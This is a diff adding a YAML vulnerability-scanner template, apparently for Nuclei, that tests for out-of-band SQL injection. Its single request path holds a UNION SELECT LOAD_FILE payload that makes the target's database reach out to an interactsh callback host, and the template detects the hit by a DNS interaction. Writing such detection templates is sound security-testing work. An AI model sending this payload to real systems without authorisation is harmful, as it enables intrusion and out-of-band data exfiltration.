@@ -1,0 +1,19 @@
+id: ai-sqli-oob-generic
+
+info:
+  name: SQLi OOB Generic (UNION + DNS Exfil)
+  severity: critical
+  author: reewardius
+  tags: sqli,oob,generic
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1 UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\')--"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
